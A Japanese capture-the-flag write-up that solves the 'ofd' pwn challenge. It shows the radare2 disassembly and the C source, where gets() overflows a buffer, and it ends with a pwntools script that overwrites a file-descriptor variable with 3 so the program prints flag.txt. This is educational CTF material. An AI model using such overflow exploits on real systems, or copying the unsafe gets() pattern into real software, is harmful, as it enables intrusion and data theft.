# ofd

`nc ofd.chal.ipfctf2021.cf 4001`

試しに接続してみると

```
$ nc ofd.chal.ipfctf2021.cf 4001
== proof-of-work: disabled ==
What your name?
hoge
Hello hoge
For information on how to handle files in a linux process, the "open" manual may be helpful.
```

名前を聞かれた上で，「Linuxのプロセスにおけるファイルのハンドリングについてはopenのマニュアルを読むと参考になる」旨がわかる．

とりあえずバイナリ読む．(俺はradare2を使います)

```
[0x004010b0]> pdf @main
            ; DATA XREF from entry0 @ 0x4010d1
┌ 227: int main (int argc, char **argv, char **envp);
│           ; var char *var_3ch @ rbp-0x3c
│           ; var int64_t var_38h @ rbp-0x38
│           ; var int64_t var_34h @ rbp-0x34
│           ; var char *buf @ rbp-0x30
│           ; var int64_t fildes @ rbp-0x10
│           ; var int64_t var_ch @ rbp-0xc
│           ; var ssize_t var_8h @ rbp-0x8
│           ; var int64_t var_4h @ rbp-0x4
│           0x004011a0      55             push rbp
│           0x004011a1      4889e5         mov rbp, rsp
│           0x004011a4      4883ec40       sub rsp, 0x40
│           0x004011a8      31f6           xor esi, esi                ; int oflag
│           0x004011aa      c745fc000000.  mov dword [var_4h], 0
│           0x004011b1      c745f8000000.  mov dword [var_8h], 0
│           0x004011b8      c745f4000000.  mov dword [var_ch], 0
│           0x004011bf      c745f0000000.  mov dword [fildes], 0
│           0x004011c6      48bf04204000.  movabs rdi, str.flag.txt    ; 0x402004 ; "flag.txt" ; const char *path
│           0x004011d0      b000           mov al, 0
│           0x004011d2      e8c9feffff     call sym.imp.open           ; int open(const char *path, int oflag)
│           0x004011d7      31f6           xor esi, esi                ; int oflag
│           0x004011d9      8945f4         mov dword [var_ch], eax
│           0x004011dc      48bf0d204000.  movabs rdi, str.help.txt    ; 0x40200d ; "help.txt" ; const char *path
│           0x004011e6      b000           mov al, 0
│           0x004011e8      e8b3feffff     call sym.imp.open           ; int open(const char *path, int oflag)
│           0x004011ed      8945f0         mov dword [fildes], eax
│           0x004011f0      48bf16204000.  movabs rdi, str.What_your_name_ ; 0x402016 ; "What your name?" ; const char *s
│           0x004011fa      e841feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004011ff      488d7dd0       lea rdi, [buf]              ; char *s
│           0x00401203      8945c8         mov dword [var_38h], eax
│           0x00401206      b000           mov al, 0
│           0x00401208      e873feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x0040120d      488d75d0       lea rsi, [buf]
│           0x00401211      48bf26204000.  movabs rdi, str.Hello__s_n  ; 0x402026 ; "Hello %s\n" ; const char *format
│           0x0040121b      8945c4         mov dword [var_3ch], eax
│           0x0040121e      b000           mov al, 0
│           0x00401220      e82bfeffff     call sym.imp.printf         ; int printf(const char *format)
│           ; CODE XREF from main @ 0x401275
│       ┌─> 0x00401225      488d75d0       lea rsi, [buf]              ; void *buf
│       ╎   0x00401229      8b7df0         mov edi, dword [fildes]     ; int fildes
│       ╎   0x0040122c      ba14000000     mov edx, 0x14               ; 20 ; size_t nbyte
│       ╎   0x00401231      e83afeffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│       ╎   0x00401236      8945f8         mov dword [var_8h], eax
│       ╎   0x00401239      83f800         cmp eax, 0
│      ┌──< 0x0040123c      0f8e38000000   jle 0x40127a
│      │╎   0x00401242      c745cc000000.  mov dword [var_34h], 0
│      │╎   ; CODE XREF from main @ 0x40126c
│     ┌───> 0x00401249      8b45cc         mov eax, dword [var_34h]
│     ╎│╎   0x0040124c      3b45f8         cmp eax, dword [var_8h]
│    ┌────< 0x0040124f      0f8d1c000000   jge 0x401271
│    │╎│╎   0x00401255      486345cc       movsxd rax, dword [var_34h]
│    │╎│╎   0x00401259      0fbe7c05d0     movsx edi, byte [rbp + rax - 0x30] ; int c
│    │╎│╎   0x0040125e      e8cdfdffff     call sym.imp.putchar        ; int putchar(int c)
│    │╎│╎   0x00401263      8b45cc         mov eax, dword [var_34h]
│    │╎│╎   0x00401266      83c001         add eax, 1
│    │╎│╎   0x00401269      8945cc         mov dword [var_34h], eax
│    │└───< 0x0040126c      e9d8ffffff     jmp 0x401249
│    │ │╎   ; CODE XREF from main @ 0x40124f
│    └────> 0x00401271      c645d000       mov byte [buf], 0
│      │└─< 0x00401275      e9abffffff     jmp 0x401225
│      │    ; CODE XREF from main @ 0x40123c
│      └──> 0x0040127a      8b45fc         mov eax, dword [var_4h]
│           0x0040127d      4883c440       add rsp, 0x40
│           0x00401281      5d             pop rbp
└           0x00401282      c3             ret
```

`flag.txt`と`help.txt`の2つのファイルを開いた後，自明なバッファオーバーフローのある`read`を行い，`rbp-0x10`にあるfdの内容を表示している事がわかる．

ここまで書いてから思い出したが，ソースコードも配布しているので，読む．

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

int main() {
    int len = 0;
    int flagfd = 0;
    int help = 0;
    char buf[0x20];

    flagfd = open("flag.txt", O_RDONLY);
    help = open("help.txt", O_RDONLY);
    puts("What your name?");
    gets(buf);
    printf("Hello %s\n", buf);
    while ((len = read(help, buf, 20)) > 0) {
        for (int i = 0; i < len; i++)
            putchar(buf[i]);
        *buf = 0;
    }
}

__attribute__((constructor))
void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(60);
}
```

バイナリからわかるように，`buf`と`help`が連続しているので，バッファオーバーフローによる変数の書き換えで，後に出力されるファイルを変更できる．

`man open`を読むと，`fd`は基本的に3からインクリメンタルに増えていくので，`flagfd = 3, help = 4`だと予想できる．

よって，`help`を3に上書きする

```python3
#!/usr/bin/env python3
from pwn import *
context.log_level = 'error'
io = remote('ofd.chal.ipfctf2021.cf', 4001)

io.recvuntil('== proof-of-work: disabled ==')

payload = b'a' * 0x20 + p64(3)

io.sendlineafter('name?', payload)
io.recvuntil('flag{')
print('flag{', end='')
print(io.readline().decode('utf-8', 'ignore'), end='')
```

